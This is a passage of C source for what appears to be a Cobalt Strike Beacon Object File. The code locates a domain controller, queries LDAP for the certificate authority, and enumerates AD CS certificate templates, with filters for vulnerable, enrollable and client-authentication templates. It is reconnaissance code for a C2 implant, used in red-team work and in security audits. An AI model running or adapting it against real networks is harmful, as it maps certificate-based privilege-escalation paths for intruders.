        if (KERNEL32$GetEnvironmentVariableW(L"LOGONSERVER", dcBuf, 256) > 0) {
            server = (WCHAR*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 256 * sizeof(WCHAR));
            if (dcBuf[0] == L'\\' && dcBuf[1] == L'\\') {
                wcscpy(server, dcBuf + 2);
            } else {
                wcscpy(server, dcBuf);
            }
        }
    }

    if (!server) {
        BeaconFormatPrintf(&output, "[-] Could not determine DC. Use /dc:DC\n");
        goto cleanup;
    }

    char* serverStr = wstr_to_str(server);
    BeaconFormatPrintf(&output, "[*] Target DC: %s\n", serverStr);


    LDAP* ld = ldap_connect(server);
    if (!ld) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to LDAP\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] LDAP connection established\n");


    WCHAR* configDN = get_config_dn_for_domain(domain);
    if (!configDN) {
        BeaconFormatPrintf(&output, "[-] Could not determine Configuration DN\n");
        WLDAP32$ldap_unbind(ld);
        goto cleanup;
    }


    char* caName = discover_ca_name(ld, configDN);
    if (caName) {
        BeaconFormatPrintf(&output, "[+] Discovered CA: %s\n", caName);
    } else {
        BeaconFormatPrintf(&output, "[!] Could not auto-discover CA name (run cert_cas to find it)\n");
    }


    enumerate_templates(ld, configDN, &output,
        vulnerableOnly != NULL, enrolleeOnly != NULL, clientAuthOnly != NULL,
        domain, serverStr, caName);


    WLDAP32$ldap_unbind(ld);
    if (caName) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, caName);
    if (serverStr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, serverStr);

cleanup:
    if (domain) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, domain);
    if (dc) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, dc);
    if (vulnerableOnly) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, vulnerableOnly);
    if (enrolleeOnly) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, enrolleeOnly);
    if (clientAuthOnly) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, clientAuthOnly);
    if (server) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, server);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
